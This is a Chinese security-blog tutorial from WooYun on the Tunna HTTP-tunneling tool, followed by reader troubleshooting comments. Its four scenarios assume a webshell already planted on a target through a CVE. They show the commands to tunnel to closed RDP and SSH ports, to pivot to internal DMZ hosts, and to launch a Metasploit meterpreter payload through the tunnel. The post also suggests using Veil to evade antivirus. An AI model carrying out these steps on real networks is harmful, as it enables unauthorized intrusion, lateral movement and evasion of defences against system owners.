<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">tunna工具使用实例</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2013/09/28 22:56" ui-time="" datetime="2013/09/28 22:56" class="published ng-binding ng-isolate-scope">2013/09/28 22:56</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>原理:就是个HTTP tunneling工具</h3><pre><code>#!php
 +-------------------------------------------+                     +-------------------------------------------+
 | Local Host                                |                     | Remote Host                               |
 |-------------------------------------------|                     |-------------------------------------------|
 |   +----------+       +------------+       |   +-------------+   |   +------------+        +----------+      |
 |   |Client App|+-----&gt;|Local Proxy |&lt;==========|  Firewall   |======&gt;|  Webshell  |+------&gt;|Server App|      |
 |   +----------+       +------------+       |   +-------------+   |   +------------+        +----------+      |
 +-------------------------------------------+                     +------------------------------------------ +
</code></pre><p>可以看出该工具先使用proxy.py监听本地一个端口,然后连接部署在远程WEB的webshell,远端的webshell会把端口转发请求转发到本地或者本地内网远程的主机,从而实现HTTP tunneling.这对于内网入侵来说,是很有用的一个工具.</p><p>该工具看起来是不是有似曾相识的感觉,恩.其实和reduh原理是一样的,不过tunna更稳定,速度更快.</p><p>下载地址是:<a href="http://www.secforce.com/media/tools/tunna_v0.1.zip">http://www.secforce.com/media/tools/tunna_v0.1.zip</a></p><p>下面讲解4个实例,就能掌握该工具使用方法了.</p><h3>实例1:</h3><p>网站对外只开放了80端口,其他的端口都是关闭的,通过CVE-2013-225得到JSP的WEBSHELL后,上传conn.jsp,做转发,实现连接本机的其他端口.</p><p>直接扫描发现3389是关闭的</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2a474349414f536a5a4f445e4f595e">[email&#160;protected]</a>:~# nmap -sS -p3389 219.x.x.x

Starting Nmap 6.40 ( http://nmap.org ) at 2013-09-26 22:47 EDT
Nmap scan report for 219.x.x.x
Host is up (0.0088s latency).
PORT     STATE SERVICE
3389/tcp close  
</code></pre><p>通过webshell上传conn.jsp到主机上,本地开始连接</p><pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v
</code></pre><p>参数含义如下:</p><pre><code>-l 表示本地监听的端口
-r 远程要转发的端口
-v 详细模式
</code></pre><p>然后本地执行</p><pre><code>rdesktop 127.0.0.1:1234
</code></pre><p>就可以连接到目标的3389了</p><p><img alt="如图1" img-src="d6b0cf1c7988e25be58f89255be1f3505a57c336.jpg"></p><h3>实例2:</h3><p>对于有些服务,比如SSH,还需要添加-s参数,才能保证连接的时候不会中断.</p><pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 22 -v -s





ssh localhost -p 1234
</code></pre><p><img alt="enter image description here" img-src="3e0203b27ae746c2ae8f22512052cd2af25940ba.jpg"></p><h3>实例3:</h3><p>场景:已经得到DMZ区的一台主机的JSPSHELL,该主机的内网IP是172.16.100.20,通过查点,发现DMZ区还有其他的主机(172.16.100.20),并且开放了3389,我们想利用HTTP tunneling,连接到172.16.100.20的3389,命令如下</p><pre><code>python2.7 proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389
</code></pre><p>这里多了一个-a参数,意义是要转发的IP</p><h3>实例4:</h3><p>对于喜欢metasploit的朋友,该工具也支持,不过如果对方有杀软的话,建议先用veil做好meterpreter的免杀.</p><p>首先把tunna_exploit.rb拷贝到msf的modules/exploits/windows/misc目录.</p><pre><code>cp ~/tunna_exploit.rb /root/metasploit-framework/modules/exploits/windows/misc
</code></pre><p>然后开始利用</p><pre><code>msf &gt; use exploit/windows/misc/tunna_exploit
msf exploit(tunna_exploit) &gt; set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD =&gt; windows/meterpreter/bind_tcp
msf exploit(tunna_exploit) &gt; set RHOST 1.3.3.7  &lt;-- 注意这里是指本地的公网IP
RHOST =&gt; 1.3.3.7
msf exploit(tunna_exploit) &gt; set TARGETURI http://219.x.x.x:8080/conn.jsp
TARGETURI =&gt; http://219.x.x.x:8080/conn.jsp
msf exploit(tunna_exploit) &gt; set VERBOSE true
VERBOSE =&gt; true
msf exploit(tunna_exploit) &gt; exploit -j
</code></pre><p>tunna除了支持jsp还支持以下环境和脚本</p><p>conn.jsp Tested on Apache Tomcat (windows + linux) conn.aspx Tested on IIS 6+8 (windows server 2003/2012) conn.php Tested on LAMP + XAMPP + IIS (windows + linux)</p><p>使用的时候需要注意:metasploit里的脚本只对应metasploit使用.</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2188" rel="bookmark" id="re1">nmap脚本使用总结</a></li><li><a href="http://drops.wooyun.org/tips/13079" rel="bookmark" id="re2">域渗透——Hook PasswordChangeNotify</a></li><li><a href="http://drops.wooyun.org/tips/5234" rel="bookmark" id="re3">内网渗透随想</a></li><li><a href="http://drops.wooyun.org/tips/8638" rel="bookmark" id="re4">通过.PAC进行网络钓鱼</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Viigoss</span> <span class="reply-time">2016-06-15 13:09:07</span></div><p></p><p>@爱上平顶山 你的问题怎么解决的？？？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SA</span> <span class="reply-time">2016-05-18 21:27:47</span></div><p></p><p>@爱上平顶山 我也遇到了一样的情况，你解决的吗，说下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是小二</span> <span class="reply-time">2016-03-27 13:57:57</span></div><p></p><p>目标环境：win2003+tomcat<br>问题：一连接就出错了<br>[+] Local Proxy listening at localhost:1234<br>Remote service to connect to at remotehost:3389<br>[Server] All good to go, ensure the listener is working ;-)</p><p>[+] Spawning keep-alive thread<br>[-] Keep-alive thread not required<br>[+] Connected from (&#039;127.0.0.1&#039;, 24595)<br>[+] Starting Ping thread<br>[-] Disconnected<br>[Server] Closing the connection</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">马崧耀</span> <span class="reply-time">2016-01-12 02:06:20</span></div><p></p><p>连接rdp，mssql，mysql都会断开。怎么破？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hh</span> <span class="reply-time">2016-01-10 16:00:08</span></div><p></p><p>[+] Local Proxy listening at localhost:8888<br>Remote service to connect to at remotehost:22</p><p>[Server] All good to go, ensure the listener is working ;-)</p><p>[+] Spawning keep-alive thread</p><p>[OK]<br>[-] Keep-alive thread exited</p><p>[Server] Closing the connection</p><p>连上后立刻断掉，这是什么情况？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hell0w0rld</span> <span class="reply-time">2015-11-18 09:55:13</span></div><p></p><p>确实连不上。。 22 3389都连不上</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0hey_boy0</span> <span class="reply-time">2015-04-15 15:34:15</span></div><p></p><p>涨姿势！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Croxy</span> <span class="reply-time">2015-02-16 22:37:16</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Kevini</span> <span class="reply-time">2014-12-09 13:29:51</span></div><p></p><p>erver] All good to go, ensure the listener is working ;-)<br>] Spawning keep-alive thread<br>] Keep-alive thread not required<br>] Connected from (&#039;127.0.0.1&#039;, 57495)<br>] Starting Ping thread<br>2J[HReceived Data: 0 (0)<br>ceived Data From Ping Thread: 0 (0)<br>nt data: 19 (19)<br>ngs sent: 0<br>2J[HReceived Data: 0 (0)<br>ceived Data From Ping Thread: 0 (0)<br>nt data: 19 (0)<br>ngs sent: 1<br>2J[HReceived Data: 0 (0)<br>ceived Data From Ping Thread: 19 (19)<br>nt data: 19 (0)<br>ngs sent: 1<br>] Disconnected<br>erver] Killing the handler thread</p><p>\Users\Kevini&gt;python D:\release\proxy.py -u http://jczx.<br>aspx -l 1234 -r 3389 -v -s</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gniq</span> <span class="reply-time">2014-10-28 22:34:30</span></div><p></p><p>php的3389转发不知道什么原因总是连不上（猜测是集成环境的原因），ssh的倒是可以。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小健客</span> <span class="reply-time">2014-09-12 22:39:53</span></div><p></p><p>额 试了一下 我的也是立马断的效果</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2014-08-21 15:55:58</span></div><p></p><p>今天试了下，压根连不上……立马掉</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tixe</span> <span class="reply-time">2014-08-19 16:12:49</span></div><p></p><p>楼主辛苦了，赞一个。<br>jsp连接ssh挺稳定的。<br>但连接aspx和楼上一样的情况，404：not found。<br>连接php，wamp的，连接就掉，。<b>Fatal error</b>: Call to undefined function socket_create() in E:绝对路径</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">未了</span> <span class="reply-time">2014-08-10 01:27:48</span></div><p></p><p>为什么非常不稳定？ 刚连上就断掉了，根本没法用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">www</span> <span class="reply-time">2014-08-09 17:19:59</span></div><p></p><p>C:\Users\W\Desktop731TMP\tunna_0.1\release&gt;proxy.py -u http://xxx.xxx.xxx.xxx/c<br>onn.aspx -l 80 -r 3389 -s -v<br>[+] Local Proxy listening at localhost:80<br>Remote service to connect to at remotehost:3389<br>[Server] All good to go, ensure the listener is working ;-)<br>[+] Spawning keep-alive thread<br>[-] Keep-alive thread not required<br>('[+] Connected from', ('127.0.0.1', 51454))<br>[+] Starting Ping thread<br>[2J[HReceived Data: 0 (0)<br>Received Data From Ping Thread: 0 (0)<br>Sent data: 19 (19)<br>Pings sent: 0<br>[2J[HReceived Data: 19 (19)<br>Received Data From Ping Thread: 0 (0)<br>Sent data: 19 (0)<br>Pings sent: 0<br>[-] Disconnected<br>[2J[HReceived Data: 19 (0)<br>Received Data From Ping Thread: 0 (0)<br>Sent data: 19 (0)<br>Pings sent: 1<br>[Server] Killing the handler thread<br>本机测试遇到这样的情况，请问前辈遇到过吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">风萧萧</span> <span class="reply-time">2014-07-30 15:22:55</span></div><p></p><p>COOL</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">m0utain</span> <span class="reply-time">2014-07-21 11:43:30</span></div><p></p><p>报的那些错误时是什么情况呢。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">CnCxzSec(衰仔)</span> <span class="reply-time">2014-01-23 15:32:11</span></div><p></p><p>新一代。。。估计你还没玩hack的时候，Mickey就是国内的知名人士了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">net2</span> <span class="reply-time">2013-12-05 12:54:02</span></div><p></p><p>删除compress.zlib://就ok。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">net2</span> <span class="reply-time">2013-12-05 11:42:05</span></div><p></p><p><b>Warning</b>: file_get_contents(compress.zlib://php://input) [<a href="function.file-get-contents" rel="nofollow">function.file-get-contents</a>]: failed to open stream: Inappropriate ioctl for device in <b>/var/www/conn.php</b> on line <b>138</b><br>主要问题出在这个地方。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一个菜鸟</span> <span class="reply-time">2013-10-15 07:49:58</span></div><p></p><p>该工具使用报错，大牛能解决一下不？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">X,D</span> <span class="reply-time">2013-10-11 11:46:09</span></div><p></p><p>很牛逼的样子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccSec</span> <span class="reply-time">2013-10-01 17:31:50</span></div><p></p><p>HTTP Error 404: Not Found</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c2y2</span> <span class="reply-time">2013-09-30 08:54:45</span></div><p></p><p>很牛逼的样子哈 学习学习 mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱上平顶山</span> <span class="reply-time">2013-09-29 20:14:37</span></div><p></p><p>楼主 求解答：<br>Remote service to connect to at remotehost:22<br>Traceback (most recent call last):<br>File "proxy.py", line 252, in<br>main()<br>File "proxy.py", line 243, in main<br>setup_tunnel()<br>File "proxy.py", line 120, in setup_tunnel<br>print opener.open(url).read()<br>File "E:\Python27\lib\urllib2.py", line 400, in open<br>response = meth(req, response)<br>File "E:\Python27\lib\urllib2.py", line 513, in http_response<br>'http', request, response, code, msg, hdrs)<br>File "E:\Python27\lib\urllib2.py", line 438, in error<br>return self._call_chain(*args)<br>File "E:\Python27\lib\urllib2.py", line 372, in _call_chain<br>result = func(*args)<br>File "E:\Python27\lib\urllib2.py", line 521, in http_error_default<br>raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)<br>urllib2.HTTPError: HTTP Error 404: Not Found</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱上平顶山</span> <span class="reply-time">2013-09-29 19:54:02</span></div><p></p><p>靠 这个一定要</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">海盗湾V</span> <span class="reply-time">2013-09-29 14:42:10</span></div><p></p><p>学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Spy4man</span> <span class="reply-time">2013-09-29 11:15:44</span></div><p></p><p>mickey兄是新一代的渗透高手！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Hxai11</span> <span class="reply-time">2013-09-29 10:51:10</span></div><p></p><p>马克</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2013-09-29 09:56:57</span></div><p></p><p>不错啊</p><p></p></div></div></div></div></div></main>